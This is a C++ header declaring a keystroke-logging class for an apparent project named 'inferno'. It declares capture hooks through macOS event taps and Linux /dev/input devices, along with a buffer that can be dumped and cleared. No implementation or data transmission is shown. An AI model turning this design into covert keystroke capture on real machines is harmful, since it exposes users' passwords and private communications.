#pragma once

#include <string>
#include <mutex>
#include <atomic>

#ifdef __APPLE__
#include <thread>
#include <CoreGraphics/CoreGraphics.h>
#endif

namespace inferno {

class KeyLogger {
public:
    KeyLogger();
    ~KeyLogger();
    KeyLogger(const KeyLogger&)            = delete;
    KeyLogger& operator=(const KeyLogger&) = delete;

    void start();
    void stop();
    [[nodiscard]] bool isRunning() const;

    // Returns the buffer contents and atomically clears it.
    std::string dump();

    // Maximum buffer size — safety cap to prevent OOM on long sessions.
    static constexpr size_t MAX_BUFFER_SIZE = 1024 * 1024; // 1MB

#ifdef INFERNO_TESTING
    // Test-only: injects a character directly into the buffer
    // without requiring a real keyboard event or OS hook.
    void injectKeystroke(char c);
#endif

private:
    std::string              m_buffer;
    mutable std::mutex       m_mutex;
    std::atomic<bool>        m_running;

#ifdef __APPLE__
    // Platform Exception: CFRunLoop thread for CGEventTap delivery
    std::thread              m_runloop_thread;
    CFRunLoopRef             m_runloop;
    CFMachPortRef            m_event_tap;
    CFRunLoopSourceRef       m_runloop_source;
    static CGEventRef        eventCallback(CGEventTapProxy proxy, CGEventType type,
                                           CGEventRef event, void* refcon);
    void appendKeystroke(const std::string& stroke);
#elif defined(__linux__)
    int                      m_input_fd; // /dev/input/eventX file descriptor
    void appendKeystroke(const std::string& stroke);
#endif
};

} // namespace inferno
